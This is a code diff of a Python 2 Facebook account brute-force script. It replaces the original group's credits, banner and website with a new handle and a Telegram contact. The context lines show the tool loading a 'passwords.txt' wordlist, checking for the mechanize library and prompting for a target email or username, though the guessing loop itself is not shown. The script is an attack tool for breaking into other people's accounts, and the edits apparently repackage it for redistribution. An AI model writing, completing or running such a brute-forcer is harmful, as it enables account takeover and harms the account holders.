@@ -28,7 +28,7 @@ mess = """
                                                          """
 
 print mess
-print "                          create  Z3roday Sudan"
+print "                          create  by frog"
 print "                         script facebook BruteForc "
 print "  Note :▂▃▄▅▆▇█▓▒░Now you can brutforce attack account fb ░▒▓█▇▆▅▄▃▂"
 
@@ -39,10 +39,11 @@ def mengetik(s):
         sys.stdout.write(c)
         sys.stdout.flush()
         time.sleep(random.random() * 0.3)
-mengetik('&_<︻╦̵̵͇̿̿̿̿ vist our site ╤───.......┣▇ https://zeroday-sudan.ml  ▇▇▇▇▇═─  \n\n')
+mengetik('&_<︻╦̵̵͇̿̿̿̿ contact me ╤───.......┣▇ https://t.me/frogsec  ▇▇▇▇▇═─  \n\n')
+
 
 def render(size, position):
-    return "[" + (" " * position) + " coded Z3roday-sudan  " + (" " * (size - position - 1)) + "]"
+    return "[" + (" " * position) + " coded frogsec  " + (" " * (size - position - 1)) + "]"
 
 def draw(size, iterations, channel=sys.stdout, waittime=0.2):
     for index in range(iterations):
@@ -76,7 +77,7 @@ except:
 	print('\n\tPlease install mechanize.\n')
 	sys.exit()
 
-print('\n---------- Welcome To FB BruteForc by TEAM-SUDAN ----------\n')
+print('\n---------- Welcome To FB BruteForc by Frogsec ----------\n')
 file=open('passwords.txt','r')
 
 email=str(raw_input('Enter Email/Username : ').strip())
